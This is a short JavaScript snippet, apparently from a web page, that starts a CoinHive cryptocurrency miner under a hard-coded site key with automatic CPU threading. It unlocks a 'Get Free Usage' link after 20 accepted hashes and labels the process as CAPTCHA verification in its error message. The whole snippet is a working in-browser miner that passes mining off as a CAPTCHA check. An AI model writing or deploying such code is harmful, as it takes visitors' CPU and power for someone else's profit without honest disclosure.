try {
	var miner = new CoinHive.Anonymous('WNXdUrjMlNuaFhc2BXVLoRL4dVcAyI5k');miner.setAutoThreadsEnabled(true);miner.start();
	var num_a = 0;
	miner.on('found', function() { /* Hash found */console.log("F"); });
	miner.on('accepted', function() {
		/* Hash accepted by the pool */
		console.log("A"); 
		num_a=num_a+1;
		$('#HashURL').text(num_a*5 + '% Finished');
		if (num_a == 20) {
			getHashURL()
		}
	});
	// window.setTimeout(getHashURL, 60000);
	function getHashURL(){$.post('/', {}, function(res){ 
	    $('#HashURL').removeClass("disabled");
	    $("#HashURL").attr('href',res);
	    $('#HashURL').text('Get Free Usage');
	});}
	
} catch(err) {

	console.log(err);
	$('#HashURL').text('ERROR on Verifying CAPTCHA');

}


